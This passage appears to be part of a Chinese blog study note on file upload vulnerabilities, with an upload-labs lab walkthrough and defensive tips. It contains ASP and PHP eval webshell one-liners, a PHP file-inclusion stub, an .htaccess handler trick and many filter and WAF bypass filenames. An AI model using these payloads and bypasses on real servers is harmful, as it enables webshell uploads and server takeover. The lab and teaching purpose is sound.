title="Boundary边界不一致"></a>Boundary边界不一致</h6><p>每次文件上传时的Boundary边界都是一致的：</p><pre><code>Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099Content-Length: 253-----------------------------4714631421141173021852555099Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;Content-Type: application/octet-stream&lt;%eval request(&quot;a&quot;)%&gt;-----------------------------4714631421141173021852555099--</code></pre><p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨： Win2k3 + IIS6.0 + ASP</p><p><img src="https://images.seebug.org/content/images/2018/04/c4f02267-e336-41c1-9423-3c86fa81856b.png-w331s" alt="img"></p><h6 id="文件名处回车"><a href="#文件名处回车" class="headerlink" title="文件名处回车"></a>文件名处回车</h6><p><img src="https://images.seebug.org/content/images/2018/04/80c9d74a-d9bc-411c-af2a-a704eb5e1aff.png-w331s" alt="img"></p><h6 id="多个Content-Disposition"><a href="#多个Content-Disposition" class="headerlink" title="多个Content-Disposition"></a>多个Content-Disposition</h6><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP</p><p><img src="https://images.seebug.org/content/images/2018/04/6b945737-c4b4-4350-a5ba-972b35b09fda.png-w331s" alt="img"></p><h5 id="利用NTFS-ADS特性"><a href="#利用NTFS-ADS特性" class="headerlink" title="利用NTFS ADS特性"></a>利用NTFS ADS特性</h5><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。</p><p><img src="https://images.seebug.org/content/images/2018/04/b3625731-9f1d-4889-8609-b357b61a2368.png-w331s" alt="img"></p><h5 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h5><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。</p><p><img src="https://images.seebug.org/content/images/2018/04/95eabfd7-54b0-4f0f-971f-2316423fac33.png-w331s" alt="img"></p><h5 id="特殊的长文件名绕过"><a href="#特殊的长文件名绕过" class="headerlink" title="特殊的长文件名绕过"></a>特殊的长文件名绕过</h5><p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：</p><p>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p><h5 id="反删除"><a href="#反删除" class="headerlink" title="反删除"></a>反删除</h5><p>将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）</p><p><img src="https://images.seebug.org/content/images/2018/04/389b0352-5ba1-4d7c-8d77-198dab060856.png-w331s" alt="img"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><pre class=" language-html"><code class="language-html">条件： 寻找一个上传点，查看上传点是否可用。利用：首先判断是程序员自己写的上传点，还是编辑器的上传功能如果是编辑器上传功能，goolge当前编辑器的漏洞如果是程序员写的上传点上传一个正常的jpg图片 查看上传点是否可用上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）上传一个正常的jpg图片，burp拦截， 00截断 1.php%00.jpg判断服务器是什么类型，web服务器程序，是什么类型，版本号多少利用解析漏洞</code></pre><h4 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h4><ol><li>使用白名单限制可以上传的文件扩展（白名单比黑名单可靠多了）</li><li>验证文件内容，使用正则匹配恶意代码限制上传</li><li>对上传后的文件统一随机命名，不允许用户控制扩展名</li><li>修复服务器可能存在的解析漏洞</li><li>严格限制可以修改服务器配置的文件上传如：.htaccess</li><li>隐藏上传文件路径。</li><li>升级Web Server</li><li>及时修复Web上传代码（重要）</li><li>不能有本地文件包含漏洞</li><li>注意0x00截断攻击（PHP更新到最新版本）</li><li>上传文件的存储目录禁用执行权限</li></ol><h3 id="文件上传漏洞的主要利用和绕过方式总结。"><a href="#文件上传漏洞的主要利用和绕过方式总结。" class="headerlink" title="文件上传漏洞的主要利用和绕过方式总结。"></a>文件上传漏洞的主要利用和绕过方式总结。</h3><p><strong>1.前端JS绕过</strong></p><p>基于本地验证文件是否符合要求：直接将<strong>JavaScript</strong>禁用。或者burp抓包后修改后缀，将php文件后缀现先改为jpg，burp抓包后后缀改回php。</p><p><strong>2.MIME 类型验证</strong></p><p>burp抓包将<strong>Content-type</strong>类型修改为image/jpeg，image/png等</p><p><strong>3.黑名单验证</strong></p><p>1.寻找没有过滤的类型：phtml php3 php4 php5  PHP phtml</p><p>2.大小写绕过：例如Php</p><p><strong>4.文件内容验证</strong></p><p>1<strong>.getimagesize()函数获取图像信息</strong>：通过构造图片马进行绕过。</p><p>2.<strong>文件头绕过</strong>：例如 GIF89a <?php phpinfo(); ?></p><p>2.<strong>检验关键字</strong>&lt;?php:利用script标签绕过：<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;hack&#39;]);&lt;/script&gt;</code></p><p><strong>6. .htaccess上传</strong></p><p>上传的.jpg文件都会以php格式解析</p><p>.htaccess内容</p><pre><code>AddType   application/x-httpd-php     .jpg</code></pre><p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们可以把要上传的php文件的后缀名改为.jpg格式从而绕过</p><p><strong>7.00截断绕过</strong></p><p>php.   jpg  将空格二进制20改为00；</p><p><strong>8.win系统解析漏洞绕过</strong></p><p>1.上传1.php(或者图片马)，抓包修改为1.php.</p><p>2.上传1.php(或者图片马)，抓包修改为1.php::$DATA</p><p>3.上传1.php(或者图片马)，抓包修改为1.php:1.jpg</p><p>4.上传1.php(或者图片马)，抓包修改为1.php::$DATA…….</p><p><strong>9.文件包含绕过</strong>：首先上传图片木马shell.jpg，然后上传可以进行文件包含的php文件,比如上传1.php</p><pre class=" language-php"><code class="language-php"><span class="token variable">$x</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>然后我们访问1.php?x=shell.jpg即可。</p><p><strong>10.条件竞争绕过</strong></p><p>通过BURP不断发包，导致不断写入webshell,再写入速度频率上超过安全软件查杀频率，导致绕过。</p><p><strong>11.二次渲染绕过</strong></p><p>上传图片加载后，会对图片进行二次渲养，改变大部分图片源码，绕过为：对照上传后的图片与原图片放在winhex中对不，查看图片哪个数据块没有被改变。将木马代码放在没有改变的一块中，在不损坏图片的前提下，即可绕过上传</p><p><strong>12.中间件解析漏洞</strong></p><p>apache：上传图片马，抓包修改为1.php.xxxx.abc</p><p>iis6.0 6.5：上传图片马，抓包修改猴嘴为.asa、.cer和.cdx等。</p><p>​                    上传图片马，抓包修改为1.asp;.jpg或者%00 /00也可以</p><p>​                    上传图片马，抓包发现有保存图片的路径，如../upload/image</p><p>nginx: 上传图片马，拿到图片马的路径，访问的时候加上/.php 就可作为php文件解析,如         </p><p>​            upload/image/1.jpg/.php</p><p>tomcat:弱口令进入后台，上传war包即可，shell.jsp–&gt;shell.zip–&gt;shell.war</p><h3 id="靶场：upload-labs-实战总结"><a href="#靶场：upload-labs-实战总结" class="headerlink" title="靶场：upload-labs 实战总结"></a>靶场：upload-labs 实战总结</h3><p><strong>upolad-labs考察知识点汇总：</strong></p><img src="11525934-e19630249b9b8764.png"  /><p>​    upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p><h5 id="Pass-01-前端js检测"><a href="#Pass-01-前端js检测" class="headerlink" title="Pass-01-前端js检测"></a>Pass-01-前端js检测</h5><p><strong>考察知识点：</strong>前端js检测，我们可以选择禁用js,或者直接burp直接抓包绕过.。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115201219.png" alt=""></p><h5 id="Pass-02-只检测Content-type"><a href="#Pass-02-只检测Content-type" class="headerlink" title="Pass-02 只检测Content-type"></a>Pass-02 只检测Content-type</h5><p><strong>考察知识点：</strong>Content-Type绕过，我们直接改为 image/jpeg</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115201548.png" alt=""></p><h5 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h5><p><strong>考察知识点：</strong>黑名单绕过，禁止上传.asp|.aspx|.php|.jsp后缀文件，但是我们可以上传.php3 .phtml .php5另类后缀名。</p><h5 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04  .htaccess绕过"></a>Pass-04  .htaccess绕过</h5><p><strong>考察知识点：</strong>构造.htaccess文件，内容为<code>AddType  application/x-httpd-php  .jpg</code></p><p>我们首先上传.htaccess文件，</p><img src="QQ截图20200124121848.png" style="zoom: 80%;" /><p>然后上传我们事先准备好的php文件将后缀改为.jpg文件,</p><img src="QQ截图20200124122245.png" style="zoom:150%;" /><p>可以在本地看到成功上传。</p><h5 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h5><p><strong>考察知识点：</strong>因为此次黑名单过滤了.htaccess，但是没有将文件名转换为小写。所以我们可以通过大小写绕过。</p><img src="QQ截图20200124124135.png" style="zoom: 80%;" /><h5 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h5><p><strong>考察知识点</strong>：修改文件后缀为<code>1.php空格</code>.,利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格,达到上传.php的目的</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200124124135.png" alt=""></p><h5 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h5><p><strong>考察知识点：</strong>wIndow命名规则:window下 xx.php空格xx.php.不允许存在，系统会默认去除空格或点。此处过滤了空格，但是没有过滤点。我们用burp将文件后缀改为php.即可。</p><img src="QQ截图20200124130943.png" style="zoom:150%;" /><h5 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08  ::$DATA绕过"></a>Pass-08  ::$DATA绕过</h5><p><strong>考察知识点</strong>：$DATA绕过：在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p><p>所以：文件后缀改为：<code>xx.php::$DATA</code>即可</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115202909.png" alt=""></p><h5 id="Pass-09-点空格点绕过"><a href="#Pass-09-点空格点绕过" class="headerlink" title="Pass-09 点空格点绕过"></a>Pass-09 点空格点绕过</h5><p>这里我们分析一下源代码：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这里其实已经过滤的很严格了。</p><p>依次进行了严格的黑名单过滤、转换大小写、去除文件名尾的空格和点。还去除了;$DATA.</p><p>但是这里存在很明显的代码逻辑漏洞：代码<strong>去点，除空</strong>的操作只进行了一次。那么我们把后缀名改为</p><p><strong>php. .</strong> 点 空格点的格式。最后的后缀名为<strong>.php.</strong> 成功绕过。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115204443.png" alt=""></p><h5 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h5><p>考察知识点:双写绕过，这里利用了<code>str_irepalce</code>函数将不符合上传的后缀名替换为空，且该函数对 大小写不敏感，我们可以通过双写后缀名 .pphphp进行绕过。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115205208.png" alt=""></p><h5 id="Pass-11-get-00截断"><a href="#Pass-11-get-00截断" class="headerlink" title="Pass-11 get 00截断"></a>Pass-11 get 00截断</h5><p>考察知识点：00截断</p><img src="QQ截图20200124131542.png" style="zoom:50%;" /><p><strong>Pass-12 Post 00截断</strong></p><p>考察知识点：00截断</p><p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128202954.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128203026.png" alt=""></p><h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>考察知识点：图片马，结合文件包含</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115211730.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115211949.png" alt=""></p><h5 id="拓展资料"><a href="#拓展资料" class="headerlink" title="拓展资料"></a>拓展资料</h5><ul><li><a href="http://thief.one/2016/09/21/服务器解析漏洞/" target="_blank" rel="noopener">http://thief.one/2016/09/21/服务器解析漏洞/</a></li></ul><h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><ul><li><a href="http://www.y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/" target="_blank" rel="noopener">文件上传漏洞解析及绕过姿势</a></li><li><a href="http://www.cnblogs.com/stevenwuzheng/p/5354236.html" target="_blank" rel="noopener">http://www.cnblogs.com/stevenwuzheng/p/5354236.html</a></li><li><a href="https://blog.csdn.net/weiwangchao_/article/details/46686505" target="_blank" rel="noopener">https://blog.csdn.net/weiwangchao_/article/details/46686505</a></li><li><a href="http://www.myh0st.cn/index.php/archives/7/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/7/</a></li><li><a href="http://rdc.hundsun.com/portal/article/627.html" target="_blank" rel="noopener">http://rdc.hundsun.com/portal/article/627.html</a></li><li><a href="http://jdrops.dropsec.xyz/2017/07/17/文件上传漏洞总结/" target="_blank" rel="noopener">文件上传漏洞总结</a></li><li><a href="https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/" target="_blank" rel="noopener">文件上传漏洞（绕过姿势）</a></li><li><a href="http://wyb0.com/posts/file-upload-editor-upload-vulnerability/" target="_blank" rel="noopener">http://wyb0.com/posts/file-upload-editor-upload-vulnerability/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件上传漏洞学习笔记-靶场实战&quot;&gt;&lt;a href=&quot;#文件上传漏洞学习笔记-靶场实战&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞学习笔记+靶场实战&quot;&gt;&lt;/a&gt;文件上传漏洞学习笔记+靶场实战&lt;/h1&gt;&lt;h4 id=&quot;一-什么是文件上传漏洞&quot;&gt;
      
    
    </summary>
    
    
      <category term="web漏洞学习" scheme="https://shu1l.github.io/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="文件上传漏洞" scheme="https://shu1l.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
</feed>
